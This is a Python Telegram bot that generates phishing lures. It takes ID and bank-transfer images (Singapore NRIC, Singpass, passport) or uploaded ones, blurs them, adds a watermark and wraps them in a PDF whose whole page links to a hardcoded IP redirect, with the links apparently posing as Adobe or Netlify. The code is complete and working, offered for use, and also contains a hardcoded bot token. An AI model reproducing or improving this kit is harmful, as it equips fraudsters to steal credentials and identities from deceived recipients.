import os
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from PIL import Image, ImageFilter, ImageDraw
import asyncio
from datetime import datetime
from io import BytesIO  # Import BytesIO for in-memory image handling

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# States for conversation
CHOOSING_OPTION, CHOOSING_TEMPLATE, WAITING_FOR_IMAGE = range(3)

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome! Please choose an option:\n"
        "1. Adobe\n"
        "2. Netlify"
    )
    return CHOOSING_OPTION

# Function to handle the option selection
async def handle_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    option = update.message.text
    if option == '1':
        context.user_data['redirect_url'] = 'http://34.172.241.179/redirect'
        await update.message.reply_text(
            "You selected Adobe. Now choose a document template:\n"
            "1. NRIC (Front) - frontnric.jpg\n"
            "2. NRIC (Front and Back) - frontbacknric.png\n"
            "3. Singpass NRIC - singpassnric.jpg\n"
            "4. Passport - passport.jpg\n"
            "5. Bank Transfer - banktransfer.jpg\n"
            "6. Use your own image"
        )
        return CHOOSING_TEMPLATE
    elif option == '2':
        context.user_data['redirect_url'] = 'http://34.172.241.179/redirectnet'
        await update.message.reply_text(
            "You selected Netlify. Now choose a document template:\n"
            "1. NRIC (Front) - frontnric.jpg\n"
            "2. NRIC (Front and Back) - frontbacknric.png\n"
            "3. Singpass NRIC - singpassnric.jpg\n"
            "4. Passport - passport.jpg\n"
            "5. Bank Transfer - banktransfer.jpg\n"
            "6. Use your own image"
        )
        return CHOOSING_TEMPLATE
    else:
        await update.message.reply_text("Invalid choice! Please select 1 or 2.")
        return CHOOSING_OPTION

# Function to handle template selection
async def handle_template_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    template_choice = update.message.text
    templates = {
        '1': 'frontnric.jpg',
        '2': 'frontbacknric.png',
        '3': 'singpassnric.jpg',
        '4': 'passport.jpg',
        '5': 'banktransfer.jpg'
    }

    if template_choice in templates:
        selected_image_path = templates[template_choice]
        await update.message.reply_text(f"You selected the template: {selected_image_path}. Processing...")
        await process_image(selected_image_path, context.user_data['redirect_url'], update)
        return ConversationHandler.END
    elif template_choice == '6':
        await update.message.reply_text("Please upload your image (jpg, png, etc.).")
        return WAITING_FOR_IMAGE
    else:
        await update.message.reply_text("Invalid choice! Please select a template from 1 to 6.")
        return CHOOSING_TEMPLATE

# Function to handle image uploads
async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'redirect_url' in context.user_data:
        # Use BytesIO to handle the image in memory
        file = await update.message.photo[-1].get_file()
        image_stream = BytesIO()
        await file.download_to_memory(image_stream)
        image_stream.seek(0)  # Go back to the start of the BytesIO stream

        await update.message.reply_text("Processing your uploaded image...")
        await process_image(image_stream, context.user_data['redirect_url'], update)
        return ConversationHandler.END
    else:
        await update.message.reply_text("Please select a template first.")

# Function to process the image and generate outputs
async def process_image(input_image, redirect_url, update):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_png = f"Screenshot_{timestamp}.png"
    output_pdf = f"Screenshot_{timestamp}.pdf"
    watermark_image = "watermark.png"

    # Apply watermark and blur
    add_watermark(input_image, watermark_image, output_png)
    create_pdf_with_hyperlink(output_png, output_pdf, redirect_url)

    # Send the files back to the user
    await update.message.reply_document(open(output_png, 'rb'))
    await update.message.reply_document(open(output_pdf, 'rb'))

    # Clean up processed files
    os.remove(output_png)
    os.remove(output_pdf)

# Function to add a watermark, scale it down, and give it rounded edges
def add_watermark(input_image_stream, watermark_image, output_png):
    original_image = Image.open(input_image_stream).convert("RGBA")
    blurred_image = original_image.filter(ImageFilter.GaussianBlur(10))
    
    with Image.open(watermark_image).convert("RGBA") as watermark:
        # Maintain the watermark's original size and scale it down if necessary
        max_watermark_height = original_image.height // 3
        watermark_aspect_ratio = watermark.width / watermark.height

        # Calculate new dimensions while maintaining the aspect ratio
        if watermark.height > max_watermark_height:
            new_watermark_height = max_watermark_height
            new_watermark_width = int(new_watermark_height * watermark_aspect_ratio)
            watermark = watermark.resize((new_watermark_width, new_watermark_height), Image.LANCZOS)

        # Create a new image with an alpha channel (transparent background)
        combined_image = Image.new("RGBA", blurred_image.size, (255, 255, 255, 0))

        # Calculate the position for watermark (center)
        watermark_position = (
            (combined_image.width - watermark.width) // 2,
            (combined_image.height - watermark.height) // 2
        )

        # Paste the blurred image and watermark onto the transparent layer
        combined_image.paste(blurred_image, (0, 0))
        combined_image.paste(watermark, watermark_position, mask=watermark)

        # Save the final image as a PNG to preserve transparency
        combined_image.save(output_png, format="PNG")

def create_pdf_with_hyperlink(image_path, pdf_path, redirect_url):
    from fpdf import FPDF

    pdf = FPDF()
    pdf.add_page()

    # Get dimensions of the image
    with Image.open(image_path).convert("RGBA") as img:
        width, height = img.size
        pdf_width = 210  # A4 width in mm
        pdf_height = pdf_width * (height / width)

        if pdf_height > 297:
            pdf_height = 297
            pdf_width = pdf_height * (width / height)

        x_offset = (210 - pdf_width) / 2
        y_offset = (297 - pdf_height) / 2

        # Save a temporary PNG file for FPDF with alpha channel preserved
        img.save("temp_image.png", "PNG")

        # Add the image to the PDF
        pdf.image("temp_image.png", x=x_offset, y=y_offset, w=pdf_width, h=pdf_height)

    # Add a full-page hyperlink using a rectangle
    link_id = pdf.add_link()
    pdf.set_link(link_id, y=0, page=1)
    pdf.link(x=0, y=0, w=210, h=297, link=redirect_url)

    pdf.output(pdf_path)

    # Clean up temporary image
    os.remove("temp_image.png")

# Main function to run the bot
def main():
    application = ApplicationBuilder().token('7656360313:AAFiIs3jGpGR0SEdRggZ7pP8LWUvR4aph3k').build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CHOOSING_OPTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_option)],
            CHOOSING_TEMPLATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_template_selection)],
            WAITING_FOR_IMAGE: [MessageHandler(filters.PHOTO, handle_image)],
        },
        fallbacks=[],
    )

    application.add_handler(conv_handler)

    application.run_polling()

if __name__ == '__main__':
    main()
